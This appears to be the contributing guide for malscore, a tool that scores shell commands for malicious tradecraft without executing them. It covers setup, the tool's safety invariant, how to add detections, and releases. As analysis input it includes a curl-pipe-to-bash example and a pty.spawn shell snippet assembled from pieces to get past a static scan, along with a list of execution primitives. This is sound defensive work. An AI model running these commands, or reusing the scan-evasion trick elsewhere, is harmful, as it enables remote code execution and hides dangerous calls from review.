# Contributing to malscore

Thanks for helping improve `malscore`. It is a small, dependency-free package, so
getting set up is quick.

## Development setup

`malscore` has no runtime dependencies and the tests use only the standard
library, so a checkout is all you need to hack on it:

```bash
git clone https://github.com/raj3shp/malscore
cd malscore
python -m unittest discover -s tests     # 87 tests, no deps required
python -m malscore "curl -s http://1.2.3.4/x.sh | bash"   # run from source
```

The release toolchain (for building and publishing) is an optional extra:

```bash
pip install -e ".[dev]"      # installs build + twine
```

The package **runs** on Python 3.8+, but **building** it (editable install,
`python -m build`, a release) needs Python 3.9+ because the build requires
`setuptools>=77` for the SPDX license metadata. Running the tests needs no build,
so they work on 3.8 too.

## The non-execution invariant

`malscore` must **never** execute, expand, glob or resolve what it analyses — it
only reads text. This is the project's core safety property and is enforced by
`tests/test_safety.py`, which:

1. statically scans every source file for execution primitives (`os.system(`,
   `subprocess`, `eval(`, `exec(`, `pty.spawn`, …), and
2. checks at runtime that assessing file-creating/deleting/substitution commands
   leaves the filesystem untouched.

Because of the static scan, when a **test** needs to feed such a primitive to the
analyser as data, assemble the literal from pieces so it does not appear verbatim
in source, e.g.:

```python
cmd = "python3 -c 'import pty; %s(\"/bin/bash\")'" % ("pty." + "spawn")
```

Never add `subprocess`, `os.system`, `eval`/`exec`, etc. to the library itself.

## Adding a detection

A detection is a **feature** (a neutral observation) plus a **signal** (weighted
judgement). See [docs/architecture.md](docs/architecture.md) for the why.

1. **Feature** — add it to the appropriate group in `malscore/tradecraft.py`
   (technique-specific shapes, grouped by ATT&CK tactic) or
   `malscore/features.py` (generic groups), and return it from that group's
   function. Features return plain ints/strings and must not judge intent.
2. **Signal** — add a `Signal` to `malscore/signals.py` with an id, a one-line
   title, a weight in `(0, 1]`, a MITRE tactic constant and technique ids, and a
   predicate (a tuple of feature names fires when any is set, or a `lambda r:`
   for anything more involved). Weight rules of thumb are documented at the top of
   that file.
3. **Tests** — add a positive case (the technique fires its signal) and, for
   anything with false-positive risk, a near-miss negative, to
   `tests/test_techniques.py`.
4. Keep false positives down: a new rule should not push routine administration
   into `medium` or above. Evaluate against representative benign traffic.

## Regenerating the signal reference

`docs/signals.md` is generated from the catalogue, not edited by hand. After
changing signals, regenerate it:

```bash
python tools/gen_signals_doc.py > docs/signals.md
```

## Pull requests

- Run `python -m unittest discover -s tests` and make sure everything passes.
- Update `CHANGELOG.md` under `[Unreleased]`.
- If you add a feature or signal, update `docs/` (regenerate `signals.md`).

## Release workflow (maintainers)

Releases are published to PyPI manually with `twine`.

1. Bump `__version__` in `malscore/__init__.py` (the packaged version is derived
   from it) and move the `CHANGELOG.md` `[Unreleased]` notes under the new version.
2. Build and validate:
   ```bash
   python -m build
   twine check dist/*
   ```
3. Inspect the artifacts if you like (`unzip -l dist/*.whl`), then upload to
   TestPyPI first and verify the listing:
   ```bash
   twine upload -r testpypi dist/*
   ```
4. Upload to PyPI:
   ```bash
   twine upload dist/*
   ```
5. Tag the release:
   ```bash
   git tag v0.1.0 && git push origin v0.1.0
   ```

`twine` reads credentials from `~/.pypirc` or the `TWINE_USERNAME`/
`TWINE_PASSWORD` environment variables; use `__token__` as the username and a PyPI
API token as the password.
